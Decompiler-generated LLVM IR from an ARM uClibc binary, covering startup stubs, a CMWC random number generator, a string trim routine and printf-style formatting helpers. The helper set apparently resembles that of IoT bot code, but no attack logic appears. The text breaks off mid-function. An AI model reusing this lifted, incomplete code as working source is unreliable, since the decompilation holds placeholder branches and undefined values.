define i32 @_call_via_lr() local_unnamed_addr {
entry:
  %v1_8108 = load i32, i32* @r0, align 4
  ret i32 %v1_8108
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_810c = load i32, i32* @r4, align 4
  store i32 %v3_810c, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i8** @global_var_2c5c8.3 to i32), i32* %r4.global-to-local, align 4
  %v2_8114 = load i8, i8* bitcast (i8** @global_var_2c5c8.3 to i8*), align 4
  %v2_8118 = icmp eq i8 %v2_8114, 0
  br i1 %v2_8118, label %dec_label_pc_8120, label %dec_label_pc_813c

dec_label_pc_8120:                                ; preds = %entry
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8138 = load i32, i32* %r4.global-to-local, align 4
  %v3_8138 = inttoptr i32 %v2_8138 to i8*
  store i8 1, i8* %v3_8138, align 1
  %v2_813c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_813c

dec_label_pc_813c:                                ; preds = %entry, %dec_label_pc_8120
  %v2_813c = phi i32 [ %v3_810c, %entry ], [ %v2_813c.pre, %dec_label_pc_8120 ]
  store i32 %v2_813c, i32* %r4.global-to-local, align 4
  ret i32 undef

; uselistorder directives
  uselistorder i8** @global_var_2c5c8.3, { 1, 0 }
  uselistorder label %dec_label_pc_813c, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
bb:
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8174 = load i32, i32* @global_var_2c140.13, align 4
  %v2_8178 = icmp eq i32 %v2_8174, 0
  br i1 %v2_8178, label %dec_label_pc_8190, label %dec_label_pc_8180

dec_label_pc_8180:                                ; preds = %bb
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_8190

dec_label_pc_8190:                                ; preds = %bb, %dec_label_pc_8180
  ret i32 ptrtoint (i32* @global_var_2c140.13 to i32)

; uselistorder directives
  uselistorder i32* @global_var_2c140.13, { 1, 0 }
  uselistorder label %dec_label_pc_8190, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_81b8 = ptrtoint i32* %stack_var_4 to i32
  %v8_81d8 = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_13230.17 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32948, i32 128916, i32 %arg1, i32 %v4_81b8)
  %v0_81dc = call i32 @abort()
  ret i32 %v0_81dc
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_81fc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_81fc, i32* @global_var_2c604.20, align 4
  %v1_821c = add i32 %v0_81fc, -1640531527
  store i32 %v1_821c, i32* @global_var_2c608.21, align 4
  %v1_8238 = add i32 %v0_81fc, 1013904242
  store i32 %v1_8238, i32* @global_var_2c60c.22, align 4
  br label %dec_label_pc_8250

dec_label_pc_8250:                                ; preds = %entry, %dec_label_pc_8250
  %storemerge12 = phi i32 [ 3, %entry ], [ %v1_8294, %dec_label_pc_8250 ]
  store i32 %storemerge12, i32* %r0.global-to-local, align 4
  %tmp = mul i32 %storemerge12, 4
  %v5_8260 = add i32 %tmp, add (i32 ptrtoint (i32* @global_var_2c604.20 to i32), i32 -12)
  %v6_8260 = inttoptr i32 %v5_8260 to i32*
  %v7_8260 = load i32, i32* %v6_8260, align 4
  %tmp10 = mul i32 %storemerge12, 4
  %v5_8270 = add i32 %tmp10, add (i32 ptrtoint (i32* @global_var_2c604.20 to i32), i32 -8)
  %v6_8270 = inttoptr i32 %v5_8270 to i32*
  %v7_8270 = load i32, i32* %v6_8270, align 4
  %v2_8274 = xor i32 %storemerge12, -1640531527
  %v2_827c = xor i32 %v2_8274, %v7_8260
  %v2_8284 = xor i32 %v2_827c, %v7_8270
  %v5_828c = mul nuw nsw i32 %storemerge12, 4
  %v6_828c = add i32 %v5_828c, ptrtoint (i32* @global_var_2c604.20 to i32)
  %v7_828c = inttoptr i32 %v6_828c to i32*
  store i32 %v2_8284, i32* %v7_828c, align 4
  %v1_8294 = add nuw nsw i32 %storemerge12, 1
  %v7_82ac = icmp slt i32 %v1_8294, 4096
  br i1 %v7_82ac, label %dec_label_pc_8250, label %dec_label_pc_82b0

dec_label_pc_82b0:                                ; preds = %dec_label_pc_8250
  %v1_82b8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_82b8

; uselistorder directives
  uselistorder i32 %storemerge12, { 5, 3, 2, 0, 1, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_8250, { 1, 0 }
}

define i32 @rand_cmwc() local_unnamed_addr {
entry:
  %v2_82f4 = load i32, i32* @global_var_2c280.25, align 4
  %v1_82f8 = add i32 %v2_82f4, 1
  %v3_8300 = urem i32 %v1_82f8, 4096
  store i32 %v3_8300, i32* @global_var_2c280.25, align 4
  %v4_8318 = mul nuw nsw i32 %v3_8300, 4
  %v5_8318 = add i32 %v4_8318, ptrtoint (i32* @global_var_2c604.20 to i32)
  %v6_8318 = inttoptr i32 %v5_8318 to i32*
  %v7_8318 = load i32, i32* %v6_8318, align 4
  %v6_8338 = udiv i32 %v7_8318, 228675
  store i32 %v6_8338, i32* @global_var_2c27c.28, align 4
  br i1 true, label %dec_label_pc_83c8, label %dec_label_pc_83a8

dec_label_pc_83a8:                                ; preds = %entry
  br label %dec_label_pc_83c8

dec_label_pc_83c8:                                ; preds = %entry, %dec_label_pc_83a8
  %v4_83e8 = mul nuw nsw i32 %v3_8300, 4
  %v5_83e8 = add i32 %v4_83e8, ptrtoint (i32* @global_var_2c604.20 to i32)
  %v6_83e8 = inttoptr i32 %v5_83e8 to i32*
  %v7_83e8 = load i32, i32* %v6_83e8, align 4
  ret i32 %v7_83e8

; uselistorder directives
  uselistorder i32 %v3_8300, { 0, 2, 1 }
  uselistorder i32* @global_var_2c604.20, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2c604.20 to i32), { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_83c8, { 1, 0 }
}

define i32 @trim(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_8428 = call i32 @strlen(i8* %arg1)
  store i32 %v3_8428, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8448

dec_label_pc_8448:                                ; preds = %dec_label_pc_8448, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_8440, %dec_label_pc_8448 ]
  %v2_8454 = add i32 %stack_var_-24.0, %tmp
  %v1_8458 = inttoptr i32 %v2_8454 to i8*
  %v2_8458 = load i8, i8* %v1_8458, align 1
  %v3_8458 = zext i8 %v2_8458 to i32
  store i32 %v3_8458, i32* %r0.global-to-local, align 4
  %v1_8460 = call i32 @isspace(i32 %v3_8458)
  store i32 %v1_8460, i32* %r0.global-to-local, align 4
  %v2_8468 = icmp eq i32 %v1_8460, 0
  %v1_8440 = add i32 %stack_var_-24.0, 1
  br i1 %v2_8468, label %dec_label_pc_8480.preheader, label %dec_label_pc_8448

dec_label_pc_8480.preheader:                      ; preds = %dec_label_pc_8448
  %v1_8430 = add i32 %v3_8428, -1
  %v5_848c11 = icmp slt i32 %v1_8430, %stack_var_-24.0
  br i1 %v5_848c11, label %dec_label_pc_8500.preheader, label %dec_label_pc_8490

dec_label_pc_8474:                                ; preds = %dec_label_pc_8490
  %v1_8478 = add i32 %stack_var_-20.012, -1
  %v5_848c = icmp slt i32 %v1_8478, %stack_var_-24.0
  br i1 %v5_848c, label %dec_label_pc_8500.preheader, label %dec_label_pc_8490

dec_label_pc_8490:                                ; preds = %dec_label_pc_8480.preheader, %dec_label_pc_8474
  %stack_var_-20.012 = phi i32 [ %v1_8478, %dec_label_pc_8474 ], [ %v1_8430, %dec_label_pc_8480.preheader ]
  %v2_849c = add i32 %stack_var_-20.012, %tmp
  %v1_84a0 = inttoptr i32 %v2_849c to i8*
  %v2_84a0 = load i8, i8* %v1_84a0, align 1
  %v3_84a0 = zext i8 %v2_84a0 to i32
  store i32 %v3_84a0, i32* %r0.global-to-local, align 4
  %v1_84a8 = call i32 @isspace(i32 %v3_84a0)
  store i32 %v1_84a8, i32* %r0.global-to-local, align 4
  %v2_84b0 = icmp eq i32 %v1_84a8, 0
  br i1 %v2_84b0, label %dec_label_pc_8500.preheader, label %dec_label_pc_8474

dec_label_pc_8500.preheader:                      ; preds = %dec_label_pc_8474, %dec_label_pc_8490, %dec_label_pc_8480.preheader
  %stack_var_-20.0.lcssa = phi i32 [ %v1_8430, %dec_label_pc_8480.preheader ], [ %v1_8478, %dec_label_pc_8474 ], [ %stack_var_-20.012, %dec_label_pc_8490 ]
  br label %dec_label_pc_8500

dec_label_pc_84c4:                                ; preds = %dec_label_pc_8500
  %v2_84e8 = add i32 %storemerge2, %tmp
  %v1_84ec = inttoptr i32 %v2_84e8 to i8*
  %v2_84ec = load i8, i8* %v1_84ec, align 1
  %v3_84f0 = inttoptr i32 %v2_8524 to i8*
  store i8 %v2_84ec, i8* %v3_84f0, align 1
  %v1_84f8 = add i32 %storemerge2, 1
  br label %dec_label_pc_8500

dec_label_pc_8500:                                ; preds = %dec_label_pc_8500.preheader, %dec_label_pc_84c4
  %storemerge2 = phi i32 [ %v1_84f8, %dec_label_pc_84c4 ], [ %stack_var_-24.0, %dec_label_pc_8500.preheader ]
  %v7_850c = icmp sgt i32 %storemerge2, %stack_var_-20.0.lcssa
  %v2_8518 = sub i32 %storemerge2, %stack_var_-24.0
  %v2_8524 = add i32 %v2_8518, %tmp
  br i1 %v7_850c, label %dec_label_pc_8510, label %dec_label_pc_84c4

dec_label_pc_8510:                                ; preds = %dec_label_pc_8500
  %v3_852c = inttoptr i32 %v2_8524 to i8*
  store i8 0, i8* %v3_852c, align 1
  %v1_8538 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_8538

; uselistorder directives
  uselistorder i32 %storemerge2, { 2, 3, 0, 1 }
  uselistorder i32 %v1_8430, { 1, 0, 2 }
  uselistorder i32 %stack_var_-24.0, { 1, 0, 2, 3, 5, 4 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 1, 5, 3, 7, 6, 0 }
  uselistorder i32 (i32)* @isspace, { 1, 0 }
  uselistorder label %dec_label_pc_8500, { 1, 0 }
  uselistorder label %dec_label_pc_8500.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8490, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_854c = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_8558 = icmp eq i32 %v0_854c, 0
  br i1 %v2_8558, label %dec_label_pc_858c, label %dec_label_pc_8560

dec_label_pc_8560:                                ; preds = %entry
  %v1_8564 = inttoptr i32 %v0_854c to i32*
  %v2_8564 = load i32, i32* %v1_8564, align 4
  %v1_8570 = trunc i32 %arg2 to i8
  %v3_8570 = inttoptr i32 %v2_8564 to i8*
  store i8 %v1_8570, i8* %v3_8570, align 1
  %v2_8578 = load i32, i32* %v1_8564, align 4
  %v1_857c = add i32 %v2_8578, 1
  store i32 %v1_857c, i32* %v1_8564, align 4
  %v1_85a8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_85a0

dec_label_pc_858c:                                ; preds = %entry
  %v2_8548 = ptrtoint i32* %stack_var_-24 to i32
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_859c = call i32 @__GI_write(i32 1, i32 %v2_8548)
  store i32 %v2_859c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_85a0

dec_label_pc_85a0:                                ; preds = %dec_label_pc_8560, %dec_label_pc_858c
  %v1_85a8 = phi i32 [ %v1_85a8.pre, %dec_label_pc_8560 ], [ %v2_859c, %dec_label_pc_858c ]
  ret i32 %v1_85a8

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_85a0, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-48 = alloca i32, align 4
  %v3_85b0 = load i32, i32* @fp, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %tmp43 = icmp slt i32 %arg3, 1
  br i1 %tmp43, label %dec_label_pc_8668, label %dec_label_pc_85e8

dec_label_pc_85e8:                                ; preds = %entry
  %v2_861820 = load i8, i8* %arg2, align 1
  %v2_861c22 = icmp eq i8 %v2_861820, 0
  br i1 %v2_861c22, label %dec_label_pc_8624, label %dec_label_pc_85fc

dec_label_pc_85fc:                                ; preds = %dec_label_pc_85e8, %dec_label_pc_85fc
  %v4_861424 = phi i32 [ %v1_860c, %dec_label_pc_85fc ], [ %tmp, %dec_label_pc_85e8 ]
  %stack_var_-40.023 = phi i32 [ %v1_8600, %dec_label_pc_85fc ], [ 0, %dec_label_pc_85e8 ]
  %v1_8600 = add i32 %stack_var_-40.023, 1
  %v1_860c = add i32 %v4_861424, 1
  %v5_8610 = inttoptr i32 %v1_860c to i8*
  %v2_8618 = load i8, i8* %v5_8610, align 1
  %v2_861c = icmp eq i8 %v2_8618, 0
  br i1 %v2_861c, label %dec_label_pc_8624, label %dec_label_pc_85fc

dec_label_pc_8624:                                ; preds = %dec_label_pc_85fc, %dec_label_pc_85e8
  %stack_var_-40.0.lcssa = phi i32 [ 0, %dec_label_pc_85e8 ], [ %v1_8600, %dec_label_pc_85fc ]
  %v5_8630 = icmp slt i32 %stack_var_-40.0.lcssa, %arg3
  br i1 %v5_8630, label %dec_label_pc_8640, label %dec_label_pc_8650

dec_label_pc_8640:                                ; preds = %dec_label_pc_8624
  %v2_8648 = sub i32 %arg3, %stack_var_-40.0.lcssa
  br label %dec_label_pc_8650

dec_label_pc_8650:                                ; preds = %dec_label_pc_8624, %dec_label_pc_8640
  %storemerge4 = phi i32 [ %v2_8648, %dec_label_pc_8640 ], [ 0, %dec_label_pc_8624 ]
  %v1_8654 = and i32 %arg4, 2
  %v2_8658 = icmp eq i32 %v1_8654, 0
  br i1 %v2_8658, label %dec_label_pc_8668, label %dec_label_pc_8660

dec_label_pc_8660:                                ; preds = %dec_label_pc_8650
  br label %dec_label_pc_8668

dec_label_pc_8668:                                ; preds = %dec_label_pc_8650, %entry, %dec_label_pc_8660
  %stack_var_-28.0 = phi i32 [ %arg3, %entry ], [ %storemerge4, %dec_label_pc_8650 ], [ %storemerge4, %dec_label_pc_8660 ]
  %stack_var_-44.0 = phi i32 [ 32, %entry ], [ 32, %dec_label_pc_8650 ], [ 48, %dec_label_pc_8660 ]
  %v1_866c = urem i32 %arg4, 2
  %v2_8670 = icmp eq i32 %v1_866c, 0
  br i1 %v2_8670, label %dec_label_pc_86a0.preheader, label %dec_label_pc_86dc.preheader

dec_label_pc_86a0.preheader:                      ; preds = %dec_label_pc_8668
  %v5_86a817 = icmp sgt i32 %stack_var_-28.0, 0
  br i1 %v5_86a817, label %dec_label_pc_867c.lr.ph, label %dec_label_pc_86dc.preheader

dec_label_pc_867c.lr.ph:                          ; preds = %dec_label_pc_86a0.preheader
  %v2_8684 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_867c

dec_label_pc_867c:                                ; preds = %dec_label_pc_867c.lr.ph, %dec_label_pc_867c
  %stack_var_-28.118 = phi i32 [ %stack_var_-28.0, %dec_label_pc_867c.lr.ph ], [ %v1_8698, %dec_label_pc_867c ]
  %v3_8684 = call i32 @printchar(i32* %v2_8684, i32 %stack_var_-44.0)
  %v3_8688 = load i32, i32* %stack_var_-48, align 4
  %v1_868c = add i32 %v3_8688, 1
  store i32 %v1_868c, i32* %stack_var_-48, align 4
  %v1_8698 = add nsw i32 %stack_var_-28.118, -1
  %v5_86a8 = icmp sgt i32 %stack_var_-28.118, 1
  br i1 %v5_86a8, label %dec_label_pc_867c, label %dec_label_pc_86dc.preheader

dec_label_pc_86dc.preheader:                      ; preds = %dec_label_pc_867c, %dec_label_pc_86a0.preheader, %dec_label_pc_8668
  %v3_872028 = phi i32 [ 0, %dec_label_pc_8668 ], [ 0, %dec_label_pc_86a0.preheader ], [ %v1_868c, %dec_label_pc_867c ]
  %stack_var_-28.2.ph = phi i32 [ %stack_var_-28.0, %dec_label_pc_8668 ], [ %stack_var_-28.0, %dec_label_pc_86a0.preheader ], [ 0, %dec_label_pc_867c ]
  %v2_86e010 = load i8, i8* %arg2, align 1
  %v2_86e412 = icmp eq i8 %v2_86e010, 0
  br i1 %v2_86e412, label %dec_label_pc_8714.preheader, label %dec_label_pc_86b0.lr.ph

dec_label_pc_86b0.lr.ph:                          ; preds = %dec_label_pc_86dc.preheader
  %v2_86c0 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_86b0

dec_label_pc_86b0:                                ; preds = %dec_label_pc_86b0.lr.ph, %dec_label_pc_86b0
  %v4_86dc14 = phi i32 [ %tmp, %dec_label_pc_86b0.lr.ph ], [ %v1_86d4, %dec_label_pc_86b0 ]
  %stack_var_-24.013 = phi i8* [ %arg2, %dec_label_pc_86b0.lr.ph ], [ %v5_86d8, %dec_label_pc_86b0 ]
  %v2_86b4 = load i8, i8* %stack_var_-24.013, align 1
  %v3_86b4 = zext i8 %v2_86b4 to i32
  %v3_86c0 = call i32 @printchar(i32* %v2_86c0, i32 %v3_86b4)
  %v3_86c4 = load i32, i32* %stack_var_-48, align 4
  %v1_86c8 = add i32 %v3_86c4, 1
  store i32 %v1_86c8, i32* %stack_var_-48, align 4
  %v1_86d4 = add i32 %v4_86dc14, 1
  %v5_86d8 = inttoptr i32 %v1_86d4 to i8*
  %v2_86e0 = load i8, i8* %v5_86d8, align 1
  %v2_86e4 = icmp eq i8 %v2_86e0, 0
  br i1 %v2_86e4, label %dec_label_pc_8714.preheader, label %dec_label_pc_86b0

dec_label_pc_8714.preheader:                      ; preds = %dec_label_pc_86b0, %dec_label_pc_86dc.preheader
  %v3_872027 = phi i32 [ %v3_872028, %dec_label_pc_86dc.preheader ], [ %v1_86c8, %dec_label_pc_86b0 ]
  %v5_871c7 = icmp sgt i32 %stack_var_-28.2.ph, 0
  br i1 %v5_871c7, label %dec_label_pc_86f0.lr.ph, label %dec_label_pc_8720

dec_label_pc_86f0.lr.ph:                          ; preds = %dec_label_pc_8714.preheader
  %v2_86f8 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_86f0

dec_label_pc_86f0:                                ; preds = %dec_label_pc_86f0.lr.ph, %dec_label_pc_86f0
  %stack_var_-28.38 = phi i32 [ %stack_var_-28.2.ph, %dec_label_pc_86f0.lr.ph ], [ %v1_870c, %dec_label_pc_86f0 ]
  %v3_86f8 = call i32 @printchar(i32* %v2_86f8, i32 %stack_var_-44.0)
  %v3_86fc = load i32, i32* %stack_var_-48, align 4
  %v1_8700 = add i32 %v3_86fc, 1
  store i32 %v1_8700, i32* %stack_var_-48, align 4
  %v1_870c = add nsw i32 %stack_var_-28.38, -1
  %v5_871c = icmp sgt i32 %stack_var_-28.38, 1
  br i1 %v5_871c, label %dec_label_pc_86f0, label %dec_label_pc_8720

dec_label_pc_8720:                                ; preds = %dec_label_pc_86f0, %dec_label_pc_8714.preheader
  %v3_8720 = phi i32 [ %v3_872027, %dec_label_pc_8714.preheader ], [ %v1_8700, %dec_label_pc_86f0 ]
  store i32 %v3_85b0, i32* @fp, align 4
  ret i32 %v3_8720

; uselistorder directives
  uselistorder i32 %v1_86d4, { 1, 0 }
  uselistorder i32 %stack_var_-40.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_860c, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i8* %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_86f0, { 1, 0 }
  uselistorder label %dec_label_pc_86b0, { 1, 0 }
  uselistorder label %dec_label_pc_867c, { 1, 0 }
  uselistorder label %dec_label_pc_8668, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8650, { 1, 0 }
  uselistorder label %dec_label_pc_85fc, { 1, 0 }
}

define i32 @printi(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_8738 = load i32, i32* @fp, align 4
  store i32 34624, i32* %stack_var_-4, align 4
  %v2_873c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_873c, i32* @fp, align 4
  %v1_8770 = icmp slt i32 %arg2, 0
  %v2_8770 = icmp eq i32 %arg2, 0
  br i1 %v2_8770, label %dec_label_pc_8778, label %dec_label_pc_87ac

dec_label_pc_8778:                                ; preds = %entry
  store i32 48, i32* %stack_var_-28, align 4
  %v5_879c = bitcast i32* %stack_var_-28 to i8*
  %v6_879c = call i32 @prints(i32 %arg1, i8* %v5_879c, i32 %arg5, i32 %arg6, i32 0)
  br label %dec_label_pc_890c

dec_label_pc_87ac:                                ; preds = %entry
  %v2_87b0 = icmp eq i32 %arg4, 0
  br i1 %v2_87b0, label %dec_label_pc_87e4, label %dec_label_pc_87b8

dec_label_pc_87b8:                                ; preds = %dec_label_pc_87ac
  %v7_87bc = icmp eq i32 %arg3, 10
  br i1 %v7_87bc, label %dec_label_pc_87c4, label %dec_label_pc_87e4

dec_label_pc_87c4:                                ; preds = %dec_label_pc_87b8
  br i1 %v1_8770, label %dec_label_pc_87d0, label %dec_label_pc_87e4

dec_label_pc_87d0:                                ; preds = %dec_label_pc_87c4
  %v1_87dc = sub i32 0, %arg2
  br label %dec_label_pc_87e4

dec_label_pc_87e4:                                ; preds = %dec_label_pc_87c4, %dec_label_pc_87b8, %dec_label_pc_87ac, %dec_label_pc_87d0
  %stack_var_-52.0 = phi i32 [ %arg2, %dec_label_pc_87ac ], [ %v1_87dc, %dec_label_pc_87d0 ], [ %arg2, %dec_label_pc_87c4 ], [ %arg2, %dec_label_pc_87b8 ]
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_87ac ], [ 1, %dec_label_pc_87d0 ], [ 0, %dec_label_pc_87c4 ], [ 0, %dec_label_pc_87b8 ]
  %tmp26 = bitcast i32* %stack_var_-17 to i8*
  store i8 0, i8* %tmp26, align 4
  %v2_88784 = icmp eq i32 %stack_var_-52.0, 0
  br i1 %v2_88784, label %dec_label_pc_8880, label %dec_label_pc_8800.lr.ph

dec_label_pc_8800.lr.ph:                          ; preds = %dec_label_pc_87e4
  %v1_8828 = add i32 %arg7, -58
  br label %dec_label_pc_8800

dec_label_pc_8800:                                ; preds = %dec_label_pc_8800.lr.ph, %dec_label_pc_8838
  %stack_var_-52.16 = phi i32 [ %stack_var_-52.0, %dec_label_pc_8800.lr.ph ], [ %v2_880c, %dec_label_pc_8838 ]
  %stack_var_-68.05 = phi i8* [ %tmp26, %dec_label_pc_8800.lr.ph ], [ %v5_8840, %dec_label_pc_8838 ]
  %v2_880c = udiv i32 %stack_var_-52.16, %arg3
  %v3_880c = urem i32 %stack_var_-52.16, %arg3
  %v7_8820 = icmp slt i32 %v3_880c, 10
  br i1 %v7_8820, label %dec_label_pc_8838, label %dec_label_pc_8824

dec_label_pc_8824:                                ; preds = %dec_label_pc_8800
  %v2_8830 = add i32 %v3_880c, %v1_8828
  br label %dec_label_pc_8838

dec_label_pc_8838:                                ; preds = %dec_label_pc_8800, %dec_label_pc_8824
  %stack_var_-64.0 = phi i32 [ %v3_880c, %dec_label_pc_8800 ], [ %v2_8830, %dec_label_pc_8824 ]
  %v4_8838 = ptrtoint i8* %stack_var_-68.05 to i32
  %v1_883c = add i32 %v4_8838, -1
  %v5_8840 = inttoptr i32 %v1_883c to i8*
  %fold = add i32 %stack_var_-64.0, 48
  %v1_8858 = trunc i32 %fold to i8
  store i8 %v1_8858, i8* %v5_8840, align 1
  %v2_8878 = icmp ult i32 %stack_var_-52.16, %arg3
  br i1 %v2_8878, label %dec_label_pc_8880, label %dec_label_pc_8800

dec_label_pc_8880:                                ; preds = %dec_label_pc_8838, %dec_label_pc_87e4
  %stack_var_-68.0.lcssa = phi i8* [ %tmp26, %dec_label_pc_87e4 ], [ %v5_8840, %dec_label_pc_8838 ]
  %v2_8884 = icmp eq i32 %stack_var_-60.0, 0
  br i1 %v2_8884, label %dec_label_pc_88e8, label %dec_label_pc_888c

dec_label_pc_888c:                                ; preds = %dec_label_pc_8880
  %v3_888c = load i32, i32* %stack_var_0, align 4
  %v2_8890 = icmp eq i32 %v3_888c, 0
  br i1 %v2_8890, label %dec_label_pc_88d0, label %dec_label_pc_8898

dec_label_pc_8898:                                ; preds = %dec_label_pc_888c
  %v1_889c = and i32 %arg6, 2
  %v2_88a0 = icmp eq i32 %v1_889c, 0
  br i1 %v2_88a0, label %dec_label_pc_88d0, label %dec_label_pc_88a8

dec_label_pc_88a8:                                ; preds = %dec_label_pc_8898
  %v2_88b0 = inttoptr i32 %arg1 to i32*
  %v3_88b0 = call i32 @printchar(i32* %v2_88b0, i32 45)
  %v3_88c0 = load i32, i32* %stack_var_0, align 4
  %v1_88c4 = add i32 %v3_88c0, -1
  store i32 %v1_88c4, i32* %stack_var_0, align 4
  br label %dec_label_pc_88e8

dec_label_pc_88d0:                                ; preds = %dec_label_pc_8898, %dec_label_pc_888c
  %v4_88d0 = ptrtoint i8* %stack_var_-68.0.lcssa to i32
  %v1_88d4 = add i32 %v4_88d0, -1
  %v5_88d8 = inttoptr i32 %v1_88d4 to i8*
  store i8 45, i8* %v5_88d8, align 1
  br label %dec_label_pc_88e8

dec_label_pc_88e8:                                ; preds = %dec_label_pc_8880, %dec_label_pc_88a8, %dec_label_pc_88d0
  %stack_var_-68.1 = phi i8* [ %stack_var_-68.0.lcssa, %dec_label_pc_8880 ], [ %v5_88d8, %dec_label_pc_88d0 ], [ %stack_var_-68.0.lcssa, %dec_label_pc_88a8 ]
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_8880 ], [ 0, %dec_label_pc_88d0 ], [ 1, %dec_label_pc_88a8 ]
  %v3_88f0 = load i32, i32* %stack_var_0, align 4
  %v6_88f8 = call i32 @prints(i32 %arg1, i8* %stack_var_-68.1, i32 %v3_88f0, i32 %arg6, i32 ptrtoint (i32* @0 to i32))
  %v2_8904 = add i32 %v6_88f8, %stack_var_-56.0
  br label %dec_label_pc_890c

dec_label_pc_890c:                                ; preds = %dec_label_pc_8778, %dec_label_pc_88e8
  %storemerge2 = phi i32 [ %v2_8904, %dec_label_pc_88e8 ], [ %v6_879c, %dec_label_pc_8778 ]
  store i32 %v3_8738, i32* @fp, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8* %stack_var_-68.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v5_8840, { 0, 2, 1 }
  uselistorder i32 %v3_880c, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.16, { 0, 2, 1 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_890c, { 1, 0 }
  uselistorder label %dec_label_pc_88e8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8838, { 1, 0 }
  uselistorder label %dec_label_pc_8800, { 1, 0 }
  uselistorder label %dec_label_pc_87e4, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-18 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 35116, i32* %stack_var_-4, align 4
  %v2_8928 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8928, i32* @fp, align 4
  %stack_var_-32.428 = inttoptr i32 %arg2 to i8*
  %v2_8cd429 = load i8, i8* %stack_var_-32.428, align 1
  %v2_8cd831 = icmp eq i8 %v2_8cd429, 0
  br i1 %v2_8cd831, label %dec_label_pc_8ce0, label %dec_label_pc_8948.lr.ph

dec_label_pc_8948.lr.ph:                          ; preds = %entry
  %v5_8c8c = bitcast i32* %stack_var_-18 to i8*
  br label %dec_label_pc_8948

dec_label_pc_8948:                                ; preds = %dec_label_pc_8948.lr.ph, %dec_label_pc_8cc4
  %stack_var_-32.435 = phi i8* [ %stack_var_-32.428, %dec_label_pc_8948.lr.ph ], [ %stack_var_-32.4, %dec_label_pc_8cc4 ]
  %stack_var_-32.4.in34 = phi i32 [ %arg2, %dec_label_pc_8948.lr.ph ], [ %v1_8cc8, %dec_label_pc_8cc4 ]
